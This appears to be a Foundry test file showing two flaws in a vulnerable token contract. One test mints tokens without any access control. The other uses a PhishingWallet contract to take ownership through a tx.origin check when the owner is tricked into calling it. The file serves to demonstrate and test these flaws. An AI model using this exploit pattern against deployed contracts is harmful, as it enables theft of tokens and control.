// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {UnprotectedToken} from "../src/UnprotectedToken.sol";

contract PhishingWallet {
    UnprotectedToken public token;

    constructor(UnprotectedToken token_) {
        token = token_;
    }

    function stealOwner(address newOwner) external {
        token.changeOwner(newOwner);
    }
}

contract UnprotectedTokenTest is Test {
    UnprotectedToken internal token;
    address internal victim = makeAddr("victim");

    function setUp() public {
        vm.prank(victim, victim);
        token = new UnprotectedToken();
    }

    function test_AnyoneCanMint() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        token.mint(attacker, 1_000_000 ether);

        assertEq(token.balanceOf(attacker), 1_000_000 ether);
    }

    function test_TxOriginPhishingStealsOwnership() public {
        address thief = makeAddr("thief");
        PhishingWallet bait = new PhishingWallet(token);

        // Victim/owner is tricked into calling the phishing contract.
        vm.prank(victim, victim);
        bait.stealOwner(thief);

        assertEq(token.owner(), thief);
    }
}
